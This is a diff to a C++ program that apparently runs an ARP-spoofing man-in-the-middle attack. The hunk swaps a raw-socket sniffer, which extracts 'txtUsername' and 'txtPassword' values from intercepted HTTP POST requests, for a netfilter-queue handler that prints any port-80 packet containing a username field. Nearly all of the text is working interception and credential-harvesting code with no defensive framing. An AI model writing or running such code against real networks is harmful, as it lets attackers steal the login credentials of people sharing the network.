@@ -330,74 +330,94 @@ void keep_sending_arp_reply( unsigned char *source_mac_char, unsigned char *gate
 
 
 }
-void analyze_packet(){
-    // filter the received packet: HTTP
-    // continuously listen to the packets on the interface and filter the HTTP packets
-    // analyze the every received HTTP packet, findout the packet with "txtUsername"
 
-    // open a raw socket to receive the packets
-    int sock_raw_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));    
-    if(sock_raw_fd < 0){
-        cerr << "Error creating socket." << endl;
+static int nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data)
+{
+    unsigned char *packet;
+    int id = 0;
+    struct nfqnl_msg_packet_hdr *ph;
+    ph = nfq_get_msg_packet_hdr(nfa);
+    if (ph)
+    {
+        id = ntohl(ph->packet_id);
     }
-    // Set up packet capture filter to capture HTTP traffic (port 80)
-    struct sock_fprog filter;
-    struct sock_filter http_filter[] = {
-        {0x28, 0, 0, 0x0000000c},
-        {0x15, 0, 6, 0x00000800},
-        {0x30, 0, 0, 0x00000017},
-        {0x15, 0, 4, 0x00000006},
-        {0x28, 0, 0, 0x00000014},
-        {0x45, 2, 0, 0x00001fff},
-        {0xb1, 0, 0, 0x0000000e},
-        {0x48, 0, 0, 0x0000000e},
-        {0x15, 0, 1, 0x00000050},
-        {0x6, 0, 0, 0x0000ffff},
-        {0x6, 0, 0, 0x00000000},
-    };
-    filter.len = sizeof(http_filter) / sizeof(http_filter[0]);
-    filter.filter = http_filter;
-    if(setsockopt(sock_raw_fd, SOL_SOCKET, SO_ATTACH_FILTER, &filter, sizeof(filter)) < 0){
-        cerr << "Error setting socket options." << endl;
-    }
-    // Start capturing packets
-    // Parse captured packets
-    // Look for HTTP POST requests
-    // Extract form data (usernames and passwords) from POST requests
-    unsigned char buffer[2048];
-    ssize_t length;
-    while (true) {
-        length = recvfrom(sock_raw_fd, buffer, 2048, 0, NULL, NULL);
-        if (length == -1) {
-            cerr << "Error receiving packet." << endl;
-        } else {
-            // Parse the packet
-            struct ether_header *eth_header = (struct ether_header *)buffer;
-            struct iphdr *ip_header = (struct iphdr *)(buffer + ETHER_HEADER_LEN);
-            struct tcphdr *tcp_header = (struct tcphdr *)(buffer + ETHER_HEADER_LEN + ip_header->ihl * 4);
-            unsigned char *payload = buffer + ETHER_HEADER_LEN + ip_header->ihl * 4 + tcp_header->doff * 4;
-            int payload_len = length - (ETHER_HEADER_LEN + ip_header->ihl * 4 + tcp_header->doff * 4);
-            // Check if the packet is an HTTP POST request
-            if (payload_len > 0 && strstr((char*)payload, "POST") != nullptr) {
-                cout << "HTTP POST request captured." << endl;
-                // Extract the form data (username and password)
-                string payload_str((char *)payload, payload_len);
-                size_t pos = payload_str.find("txtUsername=");
-                if (pos != string::npos) {
-                    size_t end_pos = payload_str.find("&", pos);
-                    string username = payload_str.substr(pos + 12, end_pos - pos - 12);
-                    cout << "Username: " << username << endl;
-                }
-                pos = payload_str.find("txtPassword=");
-                if (pos != string::npos) {
-                    size_t end_pos = payload_str.find("&", pos);
-                    string password = payload_str.substr(pos + 12, end_pos - pos - 12);
-                    cout << "Password: " << password << endl;
+    int ret = nfq_get_payload(nfa, &packet);
+    if (ret >= 0)
+    {
+        struct iphdr *ip_header = (struct iphdr *)packet;
+        if (ip_header->protocol == IPPROTO_TCP)
+        {
+            struct tcphdr *tcp_header = (struct tcphdr *)(packet + ip_header->ihl * 4);
+            if (ntohs(tcp_header->dest) == 80)
+            {
+                // HTTP packet
+                char *http_content = (char *)(packet + ip_header->ihl * 4 + tcp_header->doff * 4);
+                string http_content_str(http_content);
+                // find the packet with "txtUsername"
+                if (http_content_str.find("txtUsername") != string::npos)
+                {
+                    cout << "HTTP POST packet with username: " << http_content_str << endl;
                 }
             }
         }
     }
-    close(sock_raw_fd);
+    return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
+}
+
+void analyze_packet(){
+    // filter the received packet: HTTP
+    // continuously listen to the packets on the interface and filter the HTTP packets
+    // analyze the every received HTTP POST packet, findout the packet with "txtUsername"
+    // Set up packet capture filter to capture HTTP traffic (port 80)
+    struct nfq_handle *h;
+    struct nfq_q_handle *qh;
+    struct nfnl_handle *nh;
+    int fd;
+    int rv;
+    char buf[4096] __attribute__((aligned));
+    unsigned char *data;
+    struct nfq_data *tb;
+    struct nfqnl_msg_packet_hdr *ph;
+    struct iphdr *ip_header;
+    struct tcphdr *tcp_header;
+    struct ether_header *eth_header;
+    struct arp_header *arp_header;
+    int id;
+    h = nfq_open();
+    if (!h)
+    {
+        cerr << "error during nfq_open()" << endl;
+        exit(1);
+    }
+    if (nfq_unbind_pf(h, AF_INET) < 0)
+    {
+        cerr << "error during nfq_unbind_pf()" << endl;
+        exit(1);
+    }
+    if (nfq_bind_pf(h, AF_INET) < 0)
+    {
+        cerr << "error during nfq_bind_pf()" << endl;
+        exit(1);
+    }
+    qh = nfq_create_queue(h, 0, &nfq_packet_handler, NULL);
+    if (!qh)
+    {
+        cerr << "error during nfq_create_queue()" << endl;
+        exit(1);
+    }
+    if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0)
+    {
+        cerr << "can't set packet_copy mode" << endl;
+        exit(1);
+    }
+    fd = nfq_fd(h);
+    while ((rv = recv(fd, buf, sizeof(buf), 0)))
+    {
+        nfq_handle_packet(h, buf, rv);
+    }
+    nfq_destroy_queue(qh);
+    nfq_close(h);
+    exit(0);
 }
     
 void arp_spoofing()
